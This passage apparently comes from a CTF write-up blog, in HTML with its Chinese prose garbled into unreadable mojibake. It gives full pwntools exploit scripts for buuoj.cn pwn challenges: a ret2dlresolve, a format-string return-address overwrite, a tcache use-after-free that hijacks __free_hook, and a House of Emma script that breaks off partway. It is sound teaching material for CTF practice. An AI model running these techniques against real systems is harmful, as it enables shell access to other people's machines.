class="line"><span class="keyword">extern</span> Elf32_Dyn_DYNAMIC[];</span><br><span class="line"></span><br><span class="line"><span class="comment">//rel.plt</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//dynsym</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼Œ_dl_runtime_resolveå‡½æ•°é€šè¿‡reloc_argå¯»å€åˆ°è¿™ä¸ªå‡½æ•°å¯¹åº”çš„é‡å®šä½è¡¨(ret.plt)ï¼Œè¿™ä¸ªå¯»å€æ˜¯åç§»å¯»å€ï¼Œç„¶åé€šè¿‡é‡å®šä½è¡¨çš„r_infoå¯»å€åˆ°å¯¹åº”çš„dynsymç¬¦å·é‡å®šä½è¡¨ï¼Œè¿™ä¸ªå¯»å€æ˜¯ä¸‹æ ‡å¯»å€ï¼Œè¦æ³¨æ„ç»“æ„ä½“çš„å¤§å°ï¼Œç„¶åé€šè¿‡ç»“æ„ä½“çš„st_nameå¯»å€åˆ°å¯¹åº”çš„dynstrï¼Œè¿™ä¸ªå¯»å€æ˜¯åç§»å¯»å€ï¼Œæ‰¾åˆ°çš„å°±æ˜¯å‡½æ•°çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ ¹æ®è¿™ä¸ªå­—ç¬¦ä¸²è¿”å›å¯¹åº”å‡½æ•°åœ°å€ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527131543243.png" alt="image-20220527131543243"></p>
<p>æ”»å‡»çš„æ–¹æ³•å°±æ˜¯è‡ªå·±æ„é€ å®Œæ•´çš„ä¸€å¥—ret.plt,dynsym,dynstr,ç„¶åæ„é€ reloc_arg,è®©å…¶æŒ‡å‘è‡ªå·±ä¼ªé€ çš„ret.pltå°±å¥½äº†ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29767</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rbx=<span class="number">0x08049022</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">hackme_addr=<span class="number">0x08049216</span></span><br><span class="line">pop_rbp=<span class="number">0x080494e3</span></span><br><span class="line">lea_ret=<span class="number">0x08049185</span></span><br><span class="line">_dl_runtime_resolve=<span class="number">0x8049030</span></span><br><span class="line">scanf_plt=elf.plt[<span class="string">&quot;__isoc99_scanf&quot;</span>]</span><br><span class="line">rel_plt=<span class="number">0x080483fc</span></span><br><span class="line">dynstr=<span class="number">0x08048308</span></span><br><span class="line">dynsym=<span class="number">0x08048248</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_num</span>(<span class="params">num</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input num&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_num</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_avg</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *&#123;0&#125;&#x27;.format(0x08049407))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input the length of array:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(-<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x804ca00</span>)</span><br><span class="line">    add_num(scanf_plt)</span><br><span class="line">    add_num(lea_ret)</span><br><span class="line">    add_num(<span class="number">0x0804A023</span>)</span><br><span class="line">    add_num(<span class="number">0x804ca00</span>+<span class="number">4</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(hackme_addr))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(hackme_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input the length of array:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_num(<span class="number">1</span>)</span><br><span class="line">    add_num(-<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x804c2b0</span>)</span><br><span class="line">    reloc_arg=<span class="number">0x4620</span></span><br><span class="line">    add_num(_dl_runtime_resolve)<span class="comment">#0x804ca08</span></span><br><span class="line">    add_num(reloc_arg)<span class="comment">#0x804ca0c</span></span><br><span class="line">    add_num(hackme_addr)<span class="comment">#0x804ca10</span></span><br><span class="line">    add_num(<span class="number">0x804ca48</span>)<span class="comment">#0x804ca14  /bin/sh_addr</span></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca18</span></span><br><span class="line">    <span class="comment">#fake_Elf32_Rel</span></span><br><span class="line">    add_num(elf.got[<span class="string">&quot;printf&quot;</span>])<span class="comment">#0x804ca1c</span></span><br><span class="line">    fake_r_info=(<span class="number">0x47e</span>&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">    add_num(fake_r_info)<span class="comment">#0x804ca20</span></span><br><span class="line"></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca24</span></span><br><span class="line">    <span class="comment">#fake_Elf32_Sym</span></span><br><span class="line">    fake_st_name=<span class="number">0x4734</span><span class="comment">#0x804ca28</span></span><br><span class="line">    add_num(fake_st_name)<span class="comment">#0x804ca2c</span></span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x12</span>)</span><br><span class="line">    add_num(<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0x74737973</span>)<span class="comment">#0x804ca3c</span></span><br><span class="line">    add_num(<span class="number">0x6d65</span>)<span class="comment">#0x804ca40</span></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca44</span></span><br><span class="line">    add_num(<span class="number">0x6e69622f</span>)<span class="comment">#0x804ca48</span></span><br><span class="line">    add_num(<span class="number">0x68732f</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>å…¶å®æ²¡å¿…è¦è¿™ä¹ˆéº»çƒ¦çš„ï¼Œç›´æ¥æ‹¿ret2libcæ‰“å°±å¥½äº†</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,æˆ‘ç›´æ¥æ”¹è¿”å›åœ°å€ä¸ºoggæ‹¿shelläº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25438</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xde78c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde78f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde792 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;est0g3?\n&quot;</span>,timeout=<span class="number">100000</span>)</span><br><span class="line">    <span class="comment">#sleep(10)</span></span><br><span class="line">    sh.send(content.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x555555554000+&#123;0&#125;)&quot;.format(0x1210))</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b printf&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    pay=<span class="string">&#x27;%10$p %9$p&#x27;</span></span><br><span class="line">    <span class="comment">#pay=&#x27;%10$p %9$p %10$hhn&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    m=sh.recv(<span class="number">29</span>)</span><br><span class="line">    <span class="built_in">print</span> m</span><br><span class="line">    fmt_stack1=<span class="built_in">int</span>(m[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(fmt_stack1)</span><br><span class="line">    fmt_stack3=fmt_stack1-<span class="number">0xf0</span></span><br><span class="line"></span><br><span class="line">    libc_addr=<span class="built_in">int</span>(m[<span class="number">15</span>:],<span class="number">16</span>)-<span class="number">0x28565</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(fmt_stack3&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%10$hn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    ogg_addr=<span class="number">0xde78f</span>+libc_addr</span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8f</span>)+<span class="string">&#x27;c%39$hhn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((fmt_stack3&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%10$hhn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg_addr&amp;<span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)+<span class="string">&#x27;c%39$hn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&#x27;111111111111111111&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>é«˜ç‰ˆæœ¬çš„uaf,æ³¨æ„tcacheçš„fdçš„å¼‚æˆ–æ“ä½œå°±å¥½ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27314</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me its size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me its content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    new(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    heap_addr2=((u64(sh.recv(<span class="number">8</span>))&lt;&lt;<span class="number">12</span>) &amp; <span class="number">0xffffffffffffffff</span>)+<span class="number">0x380</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    free_hook=libc.sym[<span class="string">&quot;__free_hook&quot;</span>]+libc_addr</span><br><span class="line">    heap_addr1=(((u64(sh.recv(<span class="number">8</span>))^heap_addr2)&lt;&lt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)+<span class="number">0x330</span></span><br><span class="line">    <span class="built_in">next</span>=((heap_addr1&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^free_hook</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    system_addr=libc.sym[<span class="string">&quot;system&quot;</span>]+libc_addr</span><br><span class="line">    new(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>é¢˜ç›®ç›´æ¥è¯´äº†æ˜¯emma,é‚£å°±æ‹¿emmaæ‰“å§ï¼Œemmaä¸€å…±æœ‰ä¸¤ç§æ‰“æ³•ï¼Œä¸€ç§æ˜¯fsopï¼Œåˆ·æ–°ioé“¾ï¼Œæ‰€ä»¥å¯ä»¥ä¼ªé€ ä¸¤ä¸ªæœ‰emmaè°ƒç”¨é“¾çš„ioç»“æ„ï¼Œä¸€ä¸ªç»“æ„æ”¹key,ç„¶åè®©ä¸‹ä¸€ä¸ªioç»“æ„æ‹¿shell,å¦ä¸€ç§æ˜¯æ§åˆ¶stderrç»“æ„ä½“ï¼Œæ„é€ emmaçš„è°ƒç”¨é“¾ï¼Œç„¶åä¿®æ”¹topchunkçš„sizeç”³è¯·å †å—æŠ¥é”™è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°çš„__fxprintfä¸­å°±ä¼šè§¦å‘emmaçš„è°ƒç”¨é“¾äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">       <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ä½¿ç”¨çš„æ˜¯åä¸€ç§æ–¹æ³•ï¼Œæµç¨‹å¦‚ä¸‹,ä¸è¿‡è¿™é“é¢˜å€’æ˜¯ä¸ç”¨setcontext,ç›´æ¥systemæ‹¿shell</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527133817903.png" alt="image-20220527133817903"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 